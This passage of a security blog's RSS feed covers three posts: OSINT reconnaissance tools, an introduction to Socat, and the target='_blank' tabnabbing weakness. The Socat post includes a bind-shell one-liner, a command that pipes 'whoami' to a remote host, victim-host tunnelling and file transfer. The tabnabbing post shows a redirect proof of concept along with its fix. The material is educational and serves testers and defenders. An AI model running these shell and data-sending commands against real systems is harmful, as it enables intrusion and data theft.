</description>
        <pubDate>Thu, 20 Sep 2018 09:00:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/webappsec/2018/09/20/ghost_svg_image_upload_to_xss.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/webappsec/2018/09/20/ghost_svg_image_upload_to_xss.html</guid>
        
        
        <category>Webappsec</category>
        
      </item>
    
      <item>
        <title>Top 10 OSINT Tools/Sources for Security Folks</title>
        <description>&lt;p&gt;Open-source intelligence (OSINT) refers to techniques used to collect data from publicly available sources that can be used for enumeration or attacking a target further. This blog post will provide information on certain well-known OSINT tools and how they can be used to collection and analyse information.&lt;/p&gt;

&lt;h3 id=&quot;harpoon-an-osint--threat-intelligence-tool&quot;&gt;10 Harpoon: an OSINT / Threat Intelligence tool&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Te-k/harpoon&quot;&gt;Link: Harpoon: an OSINT / Threat Intelligence tool&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Harpoon is a quite recent addition to the OSINT field. Harpoon is a plugin-based tool and it can be used to search multiple services such as Malshare, Spyonweb, Certspotter, Binaryedge and Asn for data.  The tool is also organised in plugins which makes it easier to write plugins to perform useful tasks.  Furthermore, this tool seems more focused on threat hunting compared to bug bounty hunting and red teaming.&lt;/p&gt;

&lt;h3 id=&quot;binaryedge-software-as-a-service&quot;&gt;9 - BinaryEdge Software as a service&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.binaryedge.io/&quot;&gt;Link: BinaryEdge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BinaryEdge is a platform that gathers data and makes the accessible for a user through their API. This platform is similar to Shodan; and provides information regarding exposed ports/services, banner grabs, torrent information, DNS queries and much more. 
&lt;img src=&quot;https://www.binaryedge.io/img/products/datapoints.png&quot; alt=&quot;alt text&quot; title=&quot;BinaryEdge&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;hunterio&quot;&gt;8 Hunter.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://hunter.io/&quot;&gt;Link: Hunter.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When targeting an organisation, services such as search engines (e.g. Google, Yahoo, Bing) can be used to search for email addresses associated with a domain that a target organization uses for their business. Tools such as &lt;strong&gt;linkedin2username&lt;/strong&gt; and &lt;strong&gt;ScrapedIn&lt;/strong&gt; can also be used  to scrape LinkedIn for potential targets without API restrictions for data reconnaissance&lt;/p&gt;

&lt;p&gt;Hunter.io can also be useful when trying to find email addresses related to a domain. The Hunter service is used for sales personnel to find contacts and leads for an organisation but this service can also be used to collect email addresses as well as names, job titles, and phone numbers.&lt;/p&gt;

&lt;h3 id=&quot;censysio&quot;&gt;7 Censys.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://censys.io/&quot;&gt;Link: Censys.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Censys is a service that scans the Internet searching for devices and return aggregate reports on how resources (i.e. Devices, websites, and certificates) are configured and deployed. This service also provides a search engine that can be used to search for this information.  Due to its feature of showing real-time data, this service can often be useful for bug bounty hunters to quickly map out easy targets.&lt;/p&gt;

&lt;p&gt;The below search is an example of looking for any service/server with its SSL/TLS certificate that can correlates to the search term ‚ÄúPayPal‚Äù&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/snoopysecurity/Public/raw/master/blog%20archive/images/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;Censys&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The above search utilises Certificate Transparency.  Certificate Transparency by design contains all the certificates issued by a participating CA for any given domain. Search engines such as &lt;strong&gt;crt.sh&lt;/strong&gt; also collects this data.&lt;/p&gt;

&lt;h3 id=&quot;open-source-intelligence-browser-extension&quot;&gt;6 Open Source Intelligence Browser Extension&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://www.osintbrowser.com&quot;&gt;Link: Open Source Intelligence Browser Extension&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Open Source Intelligence Browser extension that can be used to quickly search for information by leveraging the Chrome browser. This extension can be useful during Intelligence (OSINT) Investigations. This includes username, telephone, domain and company searches.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.osintbrowser.com/img/screenshot.png&quot; alt=&quot;alt text&quot; title=&quot;http://www.osintbrowser.com&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;whatweb-scanner&quot;&gt;5 WhatWeb Scanner&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb&quot;&gt;Link: WhatWeb Scanner&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.&lt;/p&gt;

&lt;p&gt;WhatWeb is a scanner that conducts web application fingerprinting. This technique often be useful for bug bounty hunters. WhatWeb contains over 1700 plugins which can be customised and used for fingerprinting and can be used to gather information on a variety of application servers including Content Management Systems, Application servers and web application dashboards.  An example of WhatWeb scanner in use can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./whatweb exampletargetsite.com/forum/
http://exampletargetsite.com/forum/ [200] PasswordField[password], HTTPServer[Apache/2.2.15], PoweredBy[phpBB], Apache[2.2.15], IP[88.198.177.36], phpBB[2], PHP[5.2.13], X-Powered-By[PHP/5.2.13], Cookies[phpbb2mysql_data,phpbb2mysql_sid], Title[Smartors Mods Forums - Reloaded], Country[GERMANY][DE]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;intrigueio&quot;&gt;4 Intrigue.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/intrigueio&quot;&gt;Link: Intrigue.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Intrigue.io is a framework that was created for automated attack surface discovery. This framework can be used for port scanning, service discovery, DNS recon as well as search for third party services such as Pastebin, Github etc. Intrigue.io also contains a web interface which can be used to quickly configure and start automated discovery scans. Intrigue.io can also be used as a Vagrant or docker container.  I prefer to use Aquatone these days for attack surface discovery&lt;/p&gt;

&lt;h3 id=&quot;aquatone&quot;&gt;3 Aquatone&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot;&gt;Link: Aquatonet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Aquatone is a well-supported and updated tool that can be used to scan large number of hosts and quickly get information regarding an organization‚Äôs attack surface. Aquatone has several features including DNS enumeration, port scanning, as well as screenshotting and reporting. Aquatone can also be easily integrated with existing toolsets with minimal effort.&lt;/p&gt;

&lt;h3 id=&quot;recon-ng&quot;&gt;2 Recon-Ng&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/LaNMaSteR53/recon-ng/&quot;&gt;Link: Recon-ng&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Recon-Ng is an extremely powerful web reconnaissance framework which can be used by security consultants to gather OSINT data quickly. Recon-Ng follows a modular approach similar to the MetaSploit framework, and also provides useful usability features such as interactive help, and command completion.  Recon-Ng contains numerous modules including DNS, Email and Web application reconnaissance. Numerous bug bounty scripts/wrappers have utilised Recon-Ng in the past including &lt;strong&gt;enumall.py&lt;/strong&gt; by @Jhaddix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.darknet.org.uk/wp-content/uploads/2016/04/recon-ng.png&quot; alt=&quot;alt text&quot; title=&quot;recon-ng&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;spiderfoot&quot;&gt;1 SpiderFoot&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.spiderfoot.net/&quot;&gt;Link: SpiderFoot&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SpiderFoot is an open source intelligence (OSINT) reconnaissance tool that can be used to gather IP addresss, domain names, hostnames, network subnets, ASNs, e-mail addresses of a given search name.  SpiderFoot can be used to query over 100 public data sources (OSINT) and is updated monthly with updates.  SpiderFoot can also be configured with public data source APIs; a full list of documentation can be found here: https://www.spiderfoot.net/documentation/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://www.spiderfoot.net/images/spiderfoot-browse.png&quot; alt=&quot;alt text&quot; title=&quot;SpiderFoot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;concluding-thoughts&quot;&gt;Concluding thoughts&lt;/h3&gt;
&lt;p&gt;Most of these tools can be used to gather port scan information, search engine dorks, python scripting, passive DNS, Threat intelligence, data visualization, Social Media, SSL/TLS certificates, WHOIS, Autonomous System (AS) Numbers, Cloud information, Wayback Machine, Web crawling, mail exchange information and much more. These are a few tools I use on a regular basis.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Honourable mentions&lt;/strong&gt;: Wapplyzer, Trape, EagleEye, RiskIQ, Skiptracer, Sn1per, Dnsdumpster, Gitrob&lt;/p&gt;

</description>
        <pubDate>Thu, 02 Aug 2018 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/osint/2018/08/02/10_OSINT_for_security_folks.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/osint/2018/08/02/10_OSINT_for_security_folks.html</guid>
        
        
        <category>OSINT</category>
        
      </item>
    
      <item>
        <title>Introduction to Socat</title>
        <description>&lt;p&gt;Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced features such as listeners for multiple clients, different protocols, reusing connections, connection redirection etc. The following are some few examples of how to use Socat and how it can be a very useful tool during assessments.&lt;/p&gt;

&lt;h3 id=&quot;socat-listener&quot;&gt;Socat Listener&lt;/h3&gt;

&lt;p&gt;The following command tells Socat to use the TCP protocol and listen on port 123 and print any given information from a client to the terminal(STDOUT). The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can be changed and specific versions can be used such as TCP4, TCP6, TCP4-LISTEN, and TCP6-LISTEN. The &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt; value can also be changed to emulate a UDP listener.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:123 STDOUT
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To connect to this server, the following command can be issued.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP:192.168.1.81:123 -
&amp;gt; hello
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will send the world &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; to the socat listener listening on port 123.&lt;/p&gt;

&lt;p&gt;Something similar to the following can also be issued to take something from STDIN and send that to a listener.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami | socat STDIN TCP:192.168.1.81:123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;A useful example of this would be the below where a UDP packet can be created from STDIN and send to a host using socat.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo ‚ÄúUDP packet‚Äù | Socat STDIO UDP4-DATAGRAM:192.168.2.1:123
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;
&lt;p&gt;The below one liner is an example of binding the bash shell to a port and connecting to it.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/test# socat TCP-LISTEN:1337 EXEC:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;socat-web-server&quot;&gt;Socat web server&lt;/h3&gt;
&lt;p&gt;To start a web server with Socat, the following command can be issued. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; option tells Socat to be verbose and the &lt;code class=&quot;highlighter-rouge&quot;&gt;-T&lt;/code&gt; option can be used to set timeouts.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat -v -T0.05 tcp-l:80,reuseaddr,fork system:&quot;echo 'HTTP/1.1 200 OK'; echo 'Connection: close'; echo; cat&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h4 id=&quot;https-server&quot;&gt;HTTPS server&lt;/h4&gt;

&lt;p&gt;Socat can also be used to setup HTTPS servers. In the below example, a self-signed certificate is created using Openssl and it is used to setup a HTTPS server.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
cat key.pem &amp;gt;&amp;gt; cert.pem 
socat OPENSSL-LISTEN:443,cert=/root/test/cert.pem -
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following command can also be using as an alternative to Openssl client and connect to services using SSL/TLS.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat - OPENSSL:192.168.1.81:443
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;terminal-emulation&quot;&gt;Terminal Emulation&lt;/h3&gt;

&lt;p&gt;In scenarios where commands need to be issued to a network medium without using a terminal emulator, the following command can be useful.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat READLINE,history:/tmp/serialcommands.txt \
  OPEN:/dev/ttyS0,ispeed=9600,ospeed=9600,crnl,raw,sane,echo=false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;redirecting-traffic&quot;&gt;Redirecting Traffic&lt;/h3&gt;
&lt;p&gt;In scenarios where you want to take incoming connections and redirect it to a Linux application, the following command can be used.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,reuseaddr,fork UNIX-CLIENT:/tmp/foo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can also specify the bind address and specify what IP ranges can connect to this listener.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;su=nobody&lt;/code&gt; value will ensure that forked processes will run as the nobody low-privileged user&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP-LISTEN:443,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;tunnelling&quot;&gt;Tunnelling&lt;/h3&gt;
&lt;p&gt;Socat can also be a good alternative to SSH when looking for a way to tunnel traffic. The following command can be used on a victim host to capture incoming traffic from port 1022 and send it to 192.168.1.70:22&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat TCP4-LISTEN:1022,reuseaddr,fork TCP4:192.168.1.70:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;file-transfer&quot;&gt;File transfer&lt;/h3&gt;
&lt;p&gt;File transfers can also be conducted with ease using Socat.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat FILE:data.txt TCP:192.168.1.81:1337
socat TCP-LISTEN:1337 OPEN:data.txt,creat,trunc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, since Socat isn‚Äôt available by default on most systems, Netcat is a better/easier option during post exploitation phases. The static compiled binary version for Socat can be found here if installation in not possible: https://github.com/andrew-d/static-binaries&lt;/p&gt;

</description>
        <pubDate>Thu, 10 May 2018 09:43:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/netsec/2018/05/10/introduction_to_socat.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/netsec/2018/05/10/introduction_to_socat.html</guid>
        
        
        <category>netsec</category>
        
      </item>
    
      <item>
        <title>The target=&quot;_blank&quot; Vulnerability</title>
        <description>&lt;p&gt;The HTML &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of them being the target attribute. An example can be seen below. Usage of certain attributes can often introduce vulnerabilities in a web application.&lt;/p&gt;

&lt;p&gt;Example Link:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;https://snoopysecurity.github.io/test.html&quot; target=&quot;_blank&quot;&amp;gt;Click Here&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The target attribute specifies the context in where the linked resource will open when the it is clicked by a user. The target attribute supports many values such as &lt;code class=&quot;highlighter-rouge&quot;&gt;_blank&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;_parent&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_top&lt;/code&gt;. The most interesting of these values is the ‚Äú_blank‚Äù value. If the target attribute is used with the ‚Äú_blank‚Äù value, the resource used as link will open in a new tab, or a new window in older browsers.&lt;/p&gt;

&lt;p&gt;However, it was discovered a while back that a link opened via target blank attribute can make changes to the original page, essentially bypassing same origin policy restrictions. An example of this are as follows.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pste.eu/p/N2ad.html&quot; target=&quot;_blank&quot;&gt;Click Here for a POC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Clicking the above link will take you to a webpage with the following JavaScript code:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
window.opener.location = 'https://media.makeameme.org/created/hacked.jpg';
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In the above code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;window.opener.location&lt;/code&gt; property is used to redirect a user from the initial clicked webpage to an attacker controlled webpage. This could be leveraged to conduct phishing attacks on the initial webpage since the window.opener object has access to the page from where the user clicked the link. However, it should be noted that it is not possible to execute JavaScript on the initial page since the window.opener object only has partial access (TLDR: you can only control the location attribute of the window object so only redirection is possible).&lt;/p&gt;

&lt;p&gt;To make detection of this vulnerability easier, I wrote a Burp Plugin which can be found here: &lt;a href=&quot;https://github.com/snoopysecurity/Noopener-Burp-Extension&quot; target=&quot;_blank&quot;&gt;https://github.com/snoopysecurity/Noopener-Burp-Extension&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The following article also shows a real-world example of this vulnerability: 
&lt;a href=&quot;https://dev.to/ben/the-targetblank-vulnerability-by-example&quot; target=&quot;_blank&quot;&gt;https://dev.to/ben/the-targetblank-vulnerability-by-example&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To prevent pages from abusing this vulnerability, the ‚Äúnoopener‚Äù and ‚Äúnoreferrer‚Äù attribute can be used. An example of this is shown below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;http://snoopysecurity.github.io&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&amp;gt;Click Me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;For older browsers, The ‚Äúnoreferrer‚Äù attribute will need to be used since certain browsers such as Firefox doesn‚Äôt support the ‚Äúnoopener‚Äù attribute.&lt;/p&gt;

&lt;h5 id=&quot;references&quot;&gt;References&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;https://mathiasbynens.github.io/rel-noopener/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 26 Apr 2018 09:43:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/webappsec/2018/04/26/target_blank_vulnerability.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/webappsec/2018/04/26/target_blank_vulnerability.html</guid>
        
        
        <category>webappsec</category>
        
      </item>
    
  </channel>
</rss>
